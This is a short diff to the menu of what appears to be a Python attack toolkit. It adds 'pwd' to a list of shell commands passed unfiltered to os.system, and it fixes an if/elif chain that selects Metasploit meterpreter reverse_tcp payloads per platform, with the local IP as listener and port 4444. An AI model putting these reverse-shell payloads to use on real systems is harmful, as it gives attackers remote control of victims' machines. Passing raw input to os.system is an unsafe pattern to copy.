@@ -156,7 +156,8 @@ def menu():
     except IndexError:
         argument4 = None
     args = tokens[1:]
-    os_cmds = ["service","ftp","ssh","echo","ifconfig","ping","clear","reset","wget","git","apt","mkdir","rm","nano","sudo","touch","man","ls","dpkg","cat","mv","cp","ps","kill"]
+    os_cmds = ["service","pwd","ftp","ssh","echo","ifconfig","ping","clear","reset",
+    "wget","git","apt","mkdir","rm","nano","sudo","touch","man","ls","dpkg","cat","mv","cp","ps","kill"]
     if command in os_cmds:
         print(" > %s$%s %s\n"%(bright_green,end, command_input))
         os.system(command_input)
@@ -2425,9 +2426,9 @@ def menu():
             lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
             lport = 4444
             if option == "windows": payload = "windows/meterpreter/reverse_tcp"
-            if option == "android": payload = "android/meterpreter/reverse_tcp"
-            if option == "osx": payload = "osx/x64/meterpreter/reverse_tcp"
-            if option == "linux": payload = "linux/x64/meterpreter/reverse_tcp"
+            elif option == "android": payload = "android/meterpreter/reverse_tcp"
+            elif option == "osx": payload = "osx/x64/meterpreter/reverse_tcp"
+            elif option == "linux": payload = "linux/x64/meterpreter/reverse_tcp"
             else:
                 print("-# (%s-%s) Payload non valida"%(red,end))
                 return menu()
